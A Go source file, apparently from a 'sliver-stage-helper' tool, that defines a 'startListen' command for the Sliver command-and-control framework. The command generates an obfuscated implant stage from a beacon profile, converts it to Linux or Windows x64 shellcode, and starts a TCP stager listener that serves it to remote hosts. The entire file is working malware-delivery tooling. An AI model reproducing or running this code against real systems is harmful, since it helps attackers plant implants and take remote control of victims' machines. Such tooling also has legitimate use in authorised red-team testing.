package starListen

import (
	ctx "context"
	"net/url"
	"os"
	"strconv"

	c "github.com/Esonhugh/sliver-stage-helper/cmd/sliverStager/cmd"
	"github.com/Esonhugh/sliver-stage-helper/pkg/shellcoder"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

func init() {
	StartListenCmd.Flags().StringVarP(&Opt.ListenUrl, "listenUrl", "l", "", "listen url")
	StartListenCmd.Flags().StringVarP(&Opt.BeaconProfile, "profile", "p", "default", "beacon profile")
	StartListenCmd.Flags().StringVarP(&Opt.RawBytesFromFile, "rawBytesFromFile", "r", "", "raw bytes from file")
	StartListenCmd.Flags().StringVarP(&Opt.StageName, "stageName", "s", "helper-built-stager", "stage name")
}

var log = logrus.WithField("cmd", "startListen")

var Opt = struct {
	ListenUrl        string
	BeaconProfile    string
	RawBytesFromFile string
	StageName        string

	schema string
	host   string
	port   uint32
}{}

var StartListenCmd = &cobra.Command{
	Use:   "startListen",
	Short: "startListen",
	Long:  "startListen",
	PreRun: func(cmd *cobra.Command, args []string) {
		u, err := url.Parse(Opt.ListenUrl)
		if err != nil {
			log.Fatalf("invalid listener URL: %v", err)
		}
		Opt.schema = u.Scheme
		Opt.host = u.Hostname()
		if u.Port() == "" {
			switch u.Scheme {
			case "tcp":
				Opt.port = 4444
			case "http":
				Opt.port = 80
			case "https":
				Opt.port = 443
			}
		} else {
			port, _ := strconv.Atoi(u.Port())
			Opt.port = uint32(port)
		}
	},
	Run: func(cmd *cobra.Command, args []string) {

		var data []byte
		in := &clientpb.StagerListenerReq{
			Host: Opt.host,
			Port: Opt.port,
		}

		if Opt.RawBytesFromFile != "" {
			var err error
			data, err = os.ReadFile(Opt.RawBytesFromFile)
			if err != nil {
				log.Fatalf("read file %s failed: %v", Opt.RawBytesFromFile, err)
				return
			}
		} else if Opt.BeaconProfile != "" {
			profile := c.Client.GetImplantProfileByName(Opt.BeaconProfile)
			if profile == nil {
				log.Fatalf("profile %s not found", Opt.BeaconProfile)
				return
			}
			profile.Config.Format = clientpb.OutputFormat_EXECUTABLE
			profile.Config.ObfuscateSymbols = true
			profile, err := c.Client.SaveImplantProfile(ctx.Background(), &clientpb.ImplantProfile{
				Name:   profile.Name + "-stager",
				Config: profile.Config,
			})
			if err != nil {
				log.Fatalf("save stager implant profile failed: %v", err)
				return
			}

			gen, err := c.Client.GenerateStage(ctx.Background(), &clientpb.GenerateStageReq{
				Profile: profile.Name,
				Name:    Opt.StageName,
			})
			if err != nil {
				log.Fatalf("generate stage failed: %v", err)
				return
			}
			data = gen.File.Data

			if profile.Config.GOARCH != "amd64" {
				log.Fatalf("unsupported architecture: %s", profile.Config.GOARCH)
			}

			switch profile.Config.GOOS {
			case generate.LINUX:
				in.Data, err = shellcoder.GenerateLinuxX64ShellcodeFromBytes(data)
			case generate.WINDOWS:
				data, err = shellcoder.GenerateWindowsX64ShellcodeFromBytes(data)
				in.Data = data
			default:
				log.Fatalf("unsupported OS: %s", profile.Config.GOOS)
				return
			}
			if err != nil {
				log.Fatalf("generate shellcode failed: %v", err)
				return
			}
		} else {
			log.Fatalf("Both RawBytesFromFile and BeaconProfile are empty")
			return
		}

		var err error
		switch Opt.schema {
		case "tcp":
			if err != nil {
				log.Fatalf("generate shellcode failed: %v", err)
				return
			}
			lns, err := c.Client.StartTCPStagerListener(ctx.Background(), in)
			if err != nil {
				log.Fatalf("start listener failed: %v", err)
				return
			}
			log.Infof("listener started at Job %v", lns.JobID)
		default:
			log.Fatalf("invalid listener URL scheme: %s", Opt.schema)
			return
		}

	},
}
